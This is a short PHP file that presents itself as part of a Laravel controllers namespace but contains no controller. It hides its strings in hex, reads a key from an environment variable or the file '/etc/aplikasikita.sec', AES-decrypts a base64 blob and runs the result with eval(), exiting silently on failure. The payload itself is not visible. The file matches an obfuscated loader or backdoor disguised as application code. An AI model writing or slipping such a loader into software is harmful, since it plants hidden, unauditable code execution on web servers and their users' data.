<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('M63wiSLJIkYIQ076lwKmyg==');

$c=base64_decode(

'VBwNsMWpw97i1qnfOwex4Ql5RqDW7AkVpGAn+nrLogocPtxhafsbPu9WRBKX8gk1zP0pPkh/bE/L' .
'PzMOZuiUCCExrH4pDFtiI1Cv2iDFWPtjTy+zrpHFXcaoizN62nTY0xFxcKCYawupPxVynkJKtsQi' .
'CbS0Pml1ZthpMy5RUI/W2JqcX1H37kFJJBl1mjdibPXyTo4oIC6IbB6kHV/b8NvH5ojnZtbVzBMF' .
'EGPB5dWrt9fNA6yIvzi2kwEAGnWXqf3Mn4eKioK5ELgoI45V9G4sAUX0otGPnoxcEeFDij9f9Qr+' .
'Nps3docfK9ZWTAXiQidROfW//YSRLzWFsRAPU8NEk6LE3FQ8WDAfzhJQPPRC0pRGciOifr+720/G' .
'Y14d92vKh56hP3Lod67ZsT0ccA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

